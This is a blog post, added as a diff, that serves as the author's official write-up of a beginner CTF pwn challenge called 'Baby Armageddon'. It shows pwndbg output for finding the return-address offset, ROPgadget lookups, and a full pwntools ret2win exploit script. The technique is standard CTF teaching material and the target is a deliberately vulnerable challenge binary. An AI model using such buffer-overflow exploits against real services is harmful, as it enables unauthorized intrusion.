@@ -1,0 +1,152 @@
+---
+title: "Badge to Breach: ICS Cyber Siege Official Writeup"
+pubDate: 2025-07-19
+description: "As team HCS, we took on a project for RE:HACK to make CTF challenges for their recent event! I authored one Pwn challenge, Baby Armageddon! Nothing too special, it's pretty much just a basic buffer overflow."
+tags:
+  - ctf
+  - pwn
+  - ret2win
+---
+
+import PostFileDownload from "../../../components/PostFileDownload.astro";
+
+## Baby Armageddon
+
+> There has been news of a new company called "Baby Armageddon Corp." and they seem to have the capabilities of destroying the entire world with one single attack on Earth. But there has been rumors that the company is ran by literal babies and they have really terrible security. Can you break through and obtain their Armageddon device through their QnA server?
+>
+> `nc <ip> <port>`
+
+<PostFileDownload name="2025-icsb2b-baby_armageddon.zip" />
+
+Simple ret2win challenge, use cyclic patterns to find the RIP. In this example we use pwndbg:
+
+```
+pwndbg> cyclic 200
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+```
+
+After generating a cyclic pattern, we can run the program and input the pattern:
+
+```
+What is your question?
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
+```
+
+After the program returns a segmentation fault we can find the RIP offset:
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fffffffdd68:
+ rip = 0x4012e2 in question; saved rip = 0x6161616161616172
+pwndbg> cyclic -l 0x6161616161616172
+Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
+Found at offset 136
+```
+
+After getting the RIP offset we need to also perform stack alignment with a ROPgadget that only ends with "ret", we can use ROPgadget for this:
+
+```sh
+ROPgadget --binary armageddon_device | grep ': ret'
+0x000000000040101a : ret
+```
+
+After that, we also need the win function, which is called `armageddon()`:
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x00000000004010b0  puts@plt
+0x00000000004010c0  fclose@plt
+0x00000000004010d0  setbuf@plt
+0x00000000004010e0  printf@plt
+0x00000000004010f0  fgets@plt
+0x0000000000401100  gets@plt
+0x0000000000401110  fopen@plt
+0x0000000000401120  exit@plt
+0x0000000000401130  _start
+0x0000000000401160  _dl_relocate_static_pie
+0x0000000000401170  deregister_tm_clones
+0x00000000004011a0  register_tm_clones
+0x00000000004011e0  __do_global_dtors_aux
+0x0000000000401210  frame_dummy
+0x0000000000401216  armageddon
+0x00000000004012a5  question
+0x00000000004012e3  main
+0x0000000000401344  _fini
+```
+
+Win function located at `0x401216`. Now to just combine this into one solver script, which expanded on with my personal custom pwntools template.
+
+I used the built-in pwntools function to speed up the gadget and win function address finding, but you can actually replace them with the previously mentioned addresses and it would definitely work the same:
+
+```py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# -*- template: wintertia -*-
+
+# ====================
+# -- PWNTOOLS SETUP --
+# ====================
+
+from pwn import *
+
+exe = context.binary = ELF(args.EXE or 'armageddon_device')
+context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+
+host = args.HOST or 'localhost'
+port = int(args.PORT or 13337)
+
+def start_local(argv=[], *a, **kw):
+	'''Execute the target binary locally'''
+	if args.GDB:
+		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+	else:
+		return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+	'''Connect to the process on the remote host'''
+	io = connect(host, port)
+	if args.GDB:
+		gdb.attach(io, gdbscript=gdbscript)
+	return io
+
+def start(argv=[], *a, **kw):
+	'''Start the exploit against the target.'''
+	if args.LOCAL:
+		return start_local(argv, *a, **kw)
+	else:
+		return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+b *question+51
+continue
+'''.format(**locals())
+
+# =======================
+# -- EXPLOIT GOES HERE --
+# =======================
+
+def exploit():
+	io = start()
+
+	rop = ROP(exe)
+
+	payload = flat(
+		cyclic(136, n=8),
+		rop.find_gadget(['ret']).address, #0x40101a
+		exe.sym['armageddon']	#0x401216
+	)
+	io.sendlineafter(b'? ', payload)
+
+	io.interactive()
+
+if __name__ == "__main__":
+	exploit()
+```
+
+Just run the script with the correct remote address and you will get the flag.
